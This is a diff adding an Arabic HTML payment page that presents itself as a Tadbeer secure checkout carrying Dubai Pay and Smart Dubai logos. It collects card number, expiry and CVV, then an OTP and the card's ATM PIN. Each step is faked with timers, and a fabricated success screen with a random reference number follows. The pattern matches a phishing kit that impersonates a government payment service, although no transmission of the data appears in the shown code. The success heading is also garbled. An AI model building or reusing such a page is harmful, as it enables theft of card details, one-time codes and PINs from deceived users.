@@ -1,0 +1,605 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>الدفع الآمن - تدبير</title>
+    <link rel="icon" type="image/png" href="media/kv4pfeid/favicon.ico">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: #f3f5f8;
+            color: #263445;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        header {
+            background: #fff;
+            border-bottom: 1px solid #e7edf5;
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        header .logo-wrap { display: flex; align-items: center; gap: 8px; }
+        header .logo-wrap img { height: 36px; }
+        header .header-logos { display: flex; align-items: center; gap: 12px; }
+        header .header-logos .logo-sadad { height: 34px; width: auto; max-width: 130px; object-fit: contain; }
+        header .header-logos .logo-smartdubai { height: 30px; width: auto; max-width: 110px; object-fit: contain; }
+        @media (min-width: 640px) {
+            header .header-logos .logo-sadad { height: 42px; max-width: 160px; }
+            header .header-logos .logo-smartdubai { height: 36px; max-width: 140px; }
+        }
+        header .back-home {
+            font-size: 13px;
+            color: #6f7b88;
+            text-decoration: none;
+        }
+        header .back-home:hover { color: #0d67be; }
+        main { flex: 1; width: 100%; max-width: 640px; margin: 0 auto; padding: 28px 16px 60px; }
+        .card {
+            background: #fff;
+            border: 1px solid #edf2f7;
+            border-radius: 22px;
+            box-shadow: 0 8px 24px rgba(148, 163, 184, 0.08);
+            padding: 24px;
+        }
+        .card-title {
+            font-size: 16px;
+            font-weight: 700;
+            color: #263445;
+            padding-bottom: 14px;
+            border-bottom: 1px solid #edf2f7;
+            margin-bottom: 4px;
+        }
+        .card + .card { margin-top: 20px; }
+        .row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 13px 0;
+            border-bottom: 1px solid #f0f4f8;
+            font-size: 14px;
+        }
+        .row:last-child { border-bottom: none; }
+        .row .lbl { color: #6f7b88; }
+        .row .val { font-weight: 600; color: #273447; }
+        .row.total .lbl { font-weight: 700; color: #263445; font-size: 15px; }
+        .row.total .val { font-weight: 700; color: #263445; font-size: 15px; }
+        .field { margin-top: 18px; }
+        .field-grid {
+            display: grid;
+            grid-template-columns: 120px 1fr;
+            gap: 12px 14px;
+            align-items: center;
+        }
+        .field label {
+            font-size: 14px;
+            font-weight: 500;
+            color: #1e293b;
+        }
+        .input-wrap { position: relative; }
+        .input-wrap .ic {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 24px;
+            height: 24px;
+            font-size: 12px;
+            border-radius: 3px;
+            color: #fff;
+            font-weight: 700;
+        }
+        .ic.visa { background: #1a1f71; color: #fff; }
+        .ic.mc { background: radial-gradient(circle at 35% 50%, #eb001b 38%, transparent 40%), radial-gradient(circle at 65% 50%, #f79e1b 38%, transparent 40%), #2b2b2b; }
+        .ic.amex { background: #006fcf; font-size: 8px; font-style: italic; }
+        .ic.unknown { background: #ef4444; }
+        input[type="text"], input[type="password"], select {
+            height: 48px;
+            width: 100%;
+            border-radius: 10px;
+            border: 1px solid #c9d3de;
+            background: #fff;
+            padding: 0 14px;
+            font-size: 15px;
+            color: #273447;
+            outline: none;
+            transition: border-color .2s, box-shadow .2s;
+        }
+        input:focus, select:focus { border-color: #8ab9db; }
+        input.card-input { padding-right: 44px; padding-left: 14px; }
+        input.err { border-color: #ef4444; background: #fef2f2; box-shadow: 0 0 0 1px #ef4444; }
+        input.ok { border-color: #22c55e; box-shadow: 0 0 0 1px #22c55e; }
+        select.err { border-color: #ef4444; }
+        select.ok { border-color: #22c55e; }
+        .err-msg { margin-top: 6px; font-size: 12px; color: #d14b4b; display: none; }
+        .err-msg.show { display: block; }
+        .check-ic {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 20px; height: 20px;
+            display: none;
+        }
+        .check-ic.ok { display: block; color: #22c55e; }
+        html[dir=rtl] .check-ic { right: auto; left: 12px; }
+        .check-ic.no { display: block; color: #ef4444; }
+        .expiry-grid {
+            display: grid;
+            grid-template-columns: 1fr 20px 1fr;
+            gap: 8px;
+            align-items: center;
+            max-width: 220px;
+        }
+        .expiry-grid .slash { text-align: center; font-size: 20px; color: #95a1af; }
+        .cvv-wrap { display: flex; gap: 12px; align-items: center; }
+        .cvv-wrap input { width: 100px; }
+        .cvv-card-ic {
+            width: 40px; height: 26px;
+            border-radius: 4px;
+            background: linear-gradient(135deg, #94a3b8, #64748b);
+            position: relative;
+            flex-shrink: 0;
+        }
+        .cvv-card-ic::after {
+            content: "";
+            position: absolute;
+            left: 3px; top: 8px;
+            width: 14px; height: 10px;
+            background: rgba(255,255,255,.55);
+            border-radius: 2px;
+        }
+        .brands { margin-top: 22px; }
+        .brands img { width: 100%; border-radius: 12px; }
+        .note {
+            text-align: right;
+            margin-top: 16px;
+            font-size: 13px;
+            line-height: 1.7;
+            color: #6e7b89;
+            font-weight: 500;
+        }
+        .actions {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-top: 24px;
+            background: #f5f8fc;
+            border: 1px solid #e8eef5;
+            border-radius: 22px;
+            padding: 16px;
+        }
+        .btn {
+            height: 50px;
+            border-radius: 999px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            border: none;
+            transition: all .2s;
+        }
+        .btn-cancel { background: transparent; color: #0d67be; border: 1px solid #cfe0f0; }
+        .btn-cancel:hover { background: #edf5fd; }
+        .btn-pay { background: #0d67be; color: #fff; }
+        .btn-pay:hover { background: #0a5aa7; }
+        .btn-pay:disabled { opacity: .6; cursor: not-allowed; }
+        footer {
+            text-align: center;
+            padding: 18px;
+            font-size: 12px;
+            color: #94a3b8;
+        }
+        /* Processing */
+        .processing {
+            text-align: center;
+            padding: 56px 20px;
+        }
+        .spin {
+            width: 56px; height: 56px;
+            margin: 0 auto 22px;
+            border-radius: 50%;
+            border: 3px solid #d8e6f3;
+            border-top-color: #0d67be;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .processing h3 { font-size: 20px; font-weight: 600; color: #263445; }
+        .processing p { margin-top: 12px; font-size: 14px; color: #6f7b88; line-height: 1.75; }
+        /* OTP / ATM step */
+        .step-center { text-align: center; padding: 8px 6px 0; }
+        .step-ic {
+            width: 64px; height: 64px;
+            margin: 0 auto 18px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+            box-shadow: 0 2px 8px rgba(0,0,0,.05);
+        }
+        .step-ic.otp { background: #edf5fd; border: 1px solid #d7e7f5; }
+        .step-ic.atm { background: #fff4e6; border: 1px solid #ffe1b4; }
+        .step-center h3 { font-size: 20px; font-weight: 600; color: #263445; }
+        .step-center p.sub { margin-top: 10px; font-size: 14px; color: #6f7b88; line-height: 1.75; }
+        .step-center .big-input {
+            margin-top: 22px;
+            height: 56px;
+            text-align: center;
+            font-size: 24px;
+            letter-spacing: .35em;
+            border-radius: 14px;
+            border: 1px solid #c9d3de;
+        }
+        .step-center .big-input:focus { border-color: #8ab9db; }
+        .warn-box {
+            margin-top: 16px;
+            border-radius: 16px;
+            border: 1px solid #ffe1b4;
+            background: #fff8eb;
+            padding: 12px 16px;
+            text-align: right;
+            font-size: 13px;
+            line-height: 1.6;
+            color: #9b6b11;
+        }
+        .submit-band {
+            margin-top: 22px;
+            border-radius: 22px;
+            border: 1px solid #e8eef5;
+            background: #f5f8fc;
+            padding: 20px;
+        }
+        .submit-band .btn { width: 100%; }
+        /* Success */
+        .success-box {
+            text-align: center;
+            padding: 44px 20px;
+            border: 1px solid #daf0df;
+        }
+        .success-box .tick {
+            width: 64px; height: 64px;
+            margin: 0 auto 18px;
+            border-radius: 50%;
+            background: #e8f8ec;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 30px;
+        }
+        .success-box h2 { font-size: 22px; font-weight: 600; color: #12834d; }
+        .success-box p { margin-top: 10px; font-size: 14px; color: #6f7b88; }
+        .amt-box {
+            margin-top: 24px;
+            border-radius: 18px;
+            background: #f5faf7;
+            padding: 16px 20px;
+        }
+        .amt-box .lbl { font-size: 13px; color: #6f7b88; }
+        .amt-box .val { margin-top: 6px; font-size: 28px; font-weight: 600; color: #12834d; }
+        .ref-box {
+            margin-top: 16px;
+            border-radius: 18px;
+            background: #f8fafc;
+            padding: 16px 20px;
+            text-align: left;
+        }
+        .ref-box .lbl { font-size: 13px; color: #6f7b88; }
+        .ref-box .val { margin-top: 6px; font-family: monospace; font-size: 14px; color: #273447; }
+        .hidden { display: none !important; }
+        @media (max-width: 520px) {
+            .field-grid { grid-template-columns: 1fr; gap: 8px; }
+            .actions { grid-template-columns: 1fr; }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="logo-wrap">
+            <img src="media/kv4pfeid/logo-website-10-4.png" alt="Tadbeer">
+            <span class="brand">الدفع الآمن</span>
+        </div>
+        <div class="header-logos">
+            <img class="logo-sadad" src="dubaipay-logo.png" alt="سداد دبي">
+            <img class="logo-smartdubai" src="smart-dubai-logo.png" alt="دبي الذكية">
+        </div>
+        <a class="back-home" href="/home">العودة للرئيسية</a>
+    </header>
+
+    <main>
+        <!-- STEP 1: Card details -->
+        <div id="pg-card">
+            <div class="card">
+                <div class="card-title">ملخص الدفع</div>
+                <div class="row"><span class="lbl">اسم مقدم الطلب</span><span class="val" id="sum-name">—</span></div>
+                <div class="row"><span class="lbl">رقم هوية مقدم الطلب</span><span class="val" id="sum-id">—</span></div>
+                <div class="row"><span class="lbl">رسوم الخدمة</span><span class="val" id="sum-fee">—</span></div>
+                <div class="row total"><span class="lbl">المبلغ المستحق</span><span class="val" id="sum-total">—</span></div>
+            </div>
+
+            <div class="card">
+                <div class="card-title">بيانات البطاقة</div>
+                <form id="card-form" novalidate>
+                    <div class="field">
+                        <div class="field-grid">
+                            <label>رقم البطاقة</label>
+                            <div class="input-wrap">
+                                <span class="ic unknown" id="brand-ic"></span>
+                                <input type="text" inputmode="numeric" class="card-input" id="card-num" placeholder="أدخل رقم البطاقة" maxlength="19" autocomplete="off">
+                                <svg class="check-ic" id="card-num-ic" width="20" height="20" viewBox="0 0 20 20" fill="none"><circle cx="10" cy="10" r="9" stroke-width="1.5"/><path d="M7 10L9 12L13 8" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+                            </div>
+                        </div>
+                        <div class="err-msg" id="card-num-err">رقم البطاقة غير صالح أو غير مدعوم</div>
+                    </div>
+
+                    <div class="field">
+                        <div class="field-grid">
+                            <label>تاريخ الانتهاء</label>
+                            <div class="expiry-grid">
+                                <select id="card-mm">
+                                    <option value="">شهر</option>
+                                </select>
+                                <span class="slash">/</span>
+                                <select id="card-yy">
+                                    <option value="">سنة</option>
+                                </select>
+                            </div>
+                        </div>
+                        <div class="err-msg" id="card-exp-err">تاريخ الانتهاء غير صالح</div>
+                    </div>
+
+                    <div class="field">
+                        <div class="field-grid">
+                            <label>رمز CVV</label>
+                            <div class="cvv-wrap">
+                                <input type="password" inputmode="numeric" id="card-cvv" placeholder="رمز CVV" maxlength="4" autocomplete="off">
+                                <span class="cvv-card-ic"></span>
+                            </div>
+                        </div>
+                        <div class="err-msg" id="card-cvv-err">رمز CVV مطلوب</div>
+                    </div>
+
+                    <p class="note">لن يتم تحصيل أي رسوم من بطاقتكم الائتمانية إلا بعد مراجعة الطلب واعتماده رسمياً. وفي حال عدم الموافقة على الطلب، فلن يتم استقطاع أي مبالغ مالية.</p>
+                    <div class="brands"><img src="card-brands.png" alt="Visa Mastercard American Express Discover"></div>
+                </form>
+            </div>
+
+            <div class="actions">
+                <button type="button" class="btn btn-cancel" id="btn-cancel">إلغاء</button>
+                <button type="button" class="btn btn-pay" id="btn-pay">ادفع الآن</button>
+            </div>
+        </div>
+
+        <!-- Processing -->
+        <div id="pg-processing" class="card processing hidden">
+            <div class="spin"></div>
+            <h3>جارٍ معالجة الطلب</h3>
+            <p id="proc-msg">جارٍ التحقق من بيانات البطاقة...</p>
+            <p>يرجى الانتظار وعدم إغلاق هذه الصفحة.</p>
+        </div>
+
+        <!-- STEP 2: OTP -->
+        <div id="pg-otp" class="hidden">
+            <div class="card">
+                <div class="card-title">ملخص الدفع</div>
+                <div class="row"><span class="lbl">المبلغ المستحق</span><span class="val" id="sum-total-2">—</span></div>
+            </div>
+            <div class="card">
+                <div class="card-title">التحقق الأمني للبطاقة</div>
+                <div class="step-center">
+                    <div class="step-ic otp">&#128241;</div>
+                    <h3>رمز التحقق (OTP)</h3>
+                    <p class="sub">تم إرسال رمز التحقق إلى رقم هاتفك المسجل</p>
+                    <input type="text" inputmode="numeric" class="big-input" id="otp-input" placeholder="أدخل رمز التحقق" maxlength="6" autocomplete="off">
+                    <div class="err-msg" id="otp-err" style="text-align:center">الرجاء إدخال رمز التحقق الكامل</div>
+                </div>
+            </div>
+            <div class="submit-band">
+                <button type="button" class="btn btn-pay" id="btn-otp">تأكيد الرمز</button>
+            </div>
+        </div>
+
+        <!-- STEP 3: ATM PIN -->
+        <div id="pg-atm" class="hidden">
+            <div class="card">
+                <div class="card-title">ملخص الدفع</div>
+                <div class="row"><span class="lbl">المبلغ المستحق</span><span class="val" id="sum-total-3">—</span></div>
+            </div>
+            <div class="card">
+                <div class="card-title">التحقق من رمز PIN</div>
+                <div class="step-center">
+                    <div class="step-ic atm">&#127974;</div>
+                    <h3>رقم PIN</h3>
+                    <p class="sub">أدخل رقم PIN الخاص ببطاقتك</p>
+                    <input type="password" inputmode="numeric" class="big-input" id="pin-input" placeholder="&#8226;&#8226;&#8226;&#8226;" maxlength="6" autocomplete="off">
+                    <div class="err-msg" id="pin-err" style="text-align:center">الرجاء إدخال PIN كاملاً</div>
+                    <div class="warn-box">لا تشارك رقم PIN الخاص بك مع أي شخص. لن يطلب موظفو تدبير هذه المعلومات أبداً.</div>
+                </div>
+            </div>
+            <div class="submit-band">
+                <button type="button" class="btn btn-pay" id="btn-pin">تأكيد PIN</button>
+            </div>
+        </div>
+
+        <!-- STEP 4: Success -->
+        <div id="pg-success" class="hidden">
+            <div class="card success-box">
+                <div class="tick">&#9989;</div>
+                <h2>ادفع الآنment Completed Successfully!</h2>
+                <p>تمت معالجة دفعتك بنجاح</p>
+                <div class="amt-box">
+                    <div class="lbl">المبلغ المدفوع</div>
+                    <div class="val" id="suc-amt">—</div>
+                </div>
+                <div class="ref-box">
+                    <div class="lbl">رقم المرجع</div>
+                    <div class="val" id="suc-ref">TD-—</div>
+                    <div class="lbl" id="suc-date" style="margin-top:6px">—</div>
+                </div>
+            </div>
+            <div class="submit-band">
+                <button type="button" class="btn btn-pay" id="btn-done">العودة للصفحة الرئيسية</button>
+            </div>
+        </div>
+    </main>
+
+    <footer>جميع الحقوق محفوظة لمؤسسة تدبير</footer>
+
+    <script>
+    (function () {
+        const fmt = n => n ? Number(n).toLocaleString('ar-EG') : null;
+
+        // Load booking data from the customer-info step
+        let booking = null, contractNo = '—';
+        try { booking = JSON.parse(sessionStorage.getItem('tdBooking') || 'null'); } catch (e) {}
+        contractNo = sessionStorage.getItem('tdContractNo') || contractNo;
+
+        function $(id) { return document.getElementById(id); }
+        function setText(id, val, fallback) { const el = $(id); if (el) el.innerText = (val ? String(val) : (fallback || '—')); }
+
+        setText('sum-name', booking ? (booking.name || booking.customerName) : null);
+        setText('sum-id', booking ? (booking.idNumber || booking.emiratesId) : null);
+        const fee = booking && booking.bookingFee ? fmt(booking.bookingFee) + ' AED' : '10 AED';
+        setText('sum-fee', fee);
+        const total = booking && booking.bookingFee ? booking.bookingFee : 10;
+        const totalStr = fmt(total) + ' AED';
+        setText('sum-total', totalStr);
+        setText('sum-total-2', totalStr);
+        setText('sum-total-3', totalStr);
+
+        function show(id) {
+            ['pg-card', 'pg-processing', 'pg-otp', 'pg-atm', 'pg-success'].forEach(x => $(x).classList.add('hidden'));
+            $(id).classList.remove('hidden');
+            window.scrollTo({ top: 0 });
+        }
+        function setProcMsg(m) { $('proc-msg').innerText = m; }
+        function clearErr(el, errEl) { el.classList.remove('err'); el.classList.remove('ok'); if (errEl) errEl.classList.remove('show'); }
+
+        // ---- Month / Year selects ----
+        (function () {
+            const mm = $('card-mm'), yy = $('card-yy');
+            for (let i = 1; i <= 12; i++) { const o = document.createElement('option'); o.value = String(i).padStart(2, '0'); o.textContent = o.value; mm.appendChild(o); }
+            const nowY = new Date().getFullYear();
+            for (let i = 0; i <= 15; i++) { const o = document.createElement('option'); o.value = String(nowY + i).slice(-2); o.textContent = o.value; yy.appendChild(o); }
+        })();
+
+        // ---- Card number validation + brand detection ----
+        function cardBrand(n) {
+            if (/^4/.test(n)) return 'visa';
+            if (/^5[1-5]/.test(n) || /^2[2-7]/.test(n)) return 'mc';
+            if (/^3[47]/.test(n)) return 'amex';
+            return 'unknown';
+        }
+        function luhn(n) {
+            let s = 0, alt = false;
+            for (let i = n.length - 1; i >= 0; i--) {
+                let d = parseInt(n[i], 10);
+                if (alt) { d *= 2; if (d > 9) d -= 9; }
+                s += d; alt = !alt;
+            }
+            return s % 10 === 0;
+        }
+        const numInput = $('card-num'), numIc = $('card-num-ic'), numErr = $('card-num-err'), brandIc = $('brand-ic');
+        numInput.addEventListener('input', function () {
+            let v = this.value.replace(/\D/g, '').slice(0, 16);
+            this.value = v.replace(/(\d{4})(?=\d)/g, '$1 ');
+            const brand = cardBrand(v);
+            brandIc.className = 'ic ' + brand;
+            brandIc.innerText = brand === 'visa' ? 'VISA' : brand === 'mc' ? 'MC' : brand === 'amex' ? 'AMEX' : '\u2715';
+            if (v.length >= 16) {
+                const valid = luhn(v);
+                this.classList.toggle('ok', valid);
+                this.classList.toggle('err', !valid);
+                numIc.classList.toggle('ok', valid);
+                numIc.classList.toggle('no', !valid);
+                numIc.innerHTML = valid
+                    ? '<circle cx="10" cy="10" r="9" fill="#dcfce7" stroke="#22c55e" stroke-width="1.5"/><path d="M7 10L9 12L13 8" stroke="#22c55e" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>'
+                    : '<circle cx="10" cy="10" r="9" fill="#fef2f2" stroke="#ef4444" stroke-width="1.5"/><path d="M7 7L13 13M13 7L7 13" stroke="#ef4444" stroke-width="2" stroke-linecap="round"/>';
+                if (!valid) numErr.classList.add('show'); else numErr.classList.remove('show');
+            } else {
+                clearErr(this, numErr); numIc.classList.remove('ok', 'no');
+            }
+        });
+
+        const cvvInput = $('card-cvv'), cvvErr = $('card-cvv-err');
+        cvvInput.addEventListener('input', function () {
+            this.value = this.value.replace(/\D/g, '').slice(0, 4);
+            if (this.value.length >= 3) cvvErr.classList.remove('show');
+        });
+
+        $('card-mm').addEventListener('change', chkExp);
+        $('card-yy').addEventListener('change', chkExp);
+        function chkExp() {
+            const m = parseInt($('card-mm').value, 10), y = parseInt($('card-yy').value, 10);
+            if (!m || !y) return;
+            const now = new Date(), curY = now.getFullYear() % 100, curM = now.getMonth() + 1;
+            const valid = !(y < curY || (y === curY && m < curM));
+            $('card-mm').classList.toggle('err', !valid); $('card-yy').classList.toggle('err', !valid);
+            $('card-exp-err').classList.toggle('show', !valid);
+        }
+
+        function step(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+        $('btn-pay').addEventListener('click', async function () {
+            const v = numInput.value.replace(/\D/g, '');
+            let bad = false;
+            if (v.length < 16 || !luhn(v)) { numInput.classList.add('err'); numErr.classList.add('show'); bad = true; }
+            if ($('card-mm').value === '' || $('card-yy').value === '') { $('card-exp-err').classList.add('show'); bad = true; }
+            if ($('card-cvv').value.length < 3) { cvvInput.classList.add('err'); cvvErr.classList.add('show'); bad = true; }
+            if (bad) return;
+
+            $('btn-pay').disabled = true;
+            show('pg-processing');
+            setProcMsg('جارٍ التحقق من بيانات البطاقة...');
+            await step(2600);
+            show('pg-otp');
+            $('btn-pay').disabled = false;
+        });
+
+        $('btn-otp').addEventListener('click', async function () {
+            const val = $('otp-input').value.replace(/\D/g, '');
+            if (val.length < 4) { $('otp-err').classList.add('show'); return; }
+            $('otp-err').classList.remove('show');
+            $('btn-otp').disabled = true;
+            show('pg-processing');
+            setProcMsg('Verifying OTP code...');
+            await step(2200);
+            show('pg-atm');
+            $('btn-otp').disabled = false;
+        });
+
+        $('btn-pin').addEventListener('click', async function () {
+            const val = $('pin-input').value.replace(/\D/g, '');
+            if (val.length < 4) { $('pin-err').classList.add('show'); return; }
+            $('pin-err').classList.remove('show');
+            $('btn-pin').disabled = true;
+            show('pg-processing');
+            setProcMsg('Processing payment...');
+            await step(2600);
+            // Success
+            setText('suc-amt', fmt(total) + ' AED');
+            const ref = 'TD-' + new Date().getFullYear() + String(Math.floor(10000 + Math.random() * 90000));
+            setText('suc-ref', ref);
+            setText('suc-date', new Date().toLocaleString('ar-EG'));
+            show('pg-success');
+            $('btn-pin').disabled = false;
+        });
+
+        $('btn-cancel').addEventListener('click', function () { window.location.href = '/home'; });
+        $('btn-done').addEventListener('click', function () { window.location.href = '/home'; });
+
+        // If user lands here with no booking (e.g. old payment success page), still fine
+        if (!booking && window.location.search.indexOf('from=success') !== -1) {
+            show('pg-success');
+            setText('suc-amt', '—');
+        }
+    })();
+    </script>
+</body>
+</html>
